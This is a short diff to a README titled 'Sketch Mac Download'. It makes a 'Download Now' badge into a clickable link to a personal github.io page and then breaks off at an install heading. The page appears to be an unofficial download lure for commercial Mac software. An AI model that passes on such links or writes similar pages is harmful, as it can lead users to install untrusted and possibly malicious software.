@@ -1,7 +1,7 @@
 # Sketch Mac Download
 ![Sketch Screenshot 1](https://pbs.twimg.com/profile_images/1858820941544869888/QHTakxOt_400x400.jpg)
 
-![Download Now](https://img.shields.io/badge/Download--Now-Sketch%20Mac-blue?style=for-the-badge&logo=apple)(https://nikolanfu.github.io/.github/sketchapp)
+[![Download Now](https://img.shields.io/badge/Download--Now-Sketch%20Mac-blue?style=for-the-badge&logo=apple)](https://nikolanfu.github.io/.github/sketchapp)
 
 ---
 ## 📦 How to Install
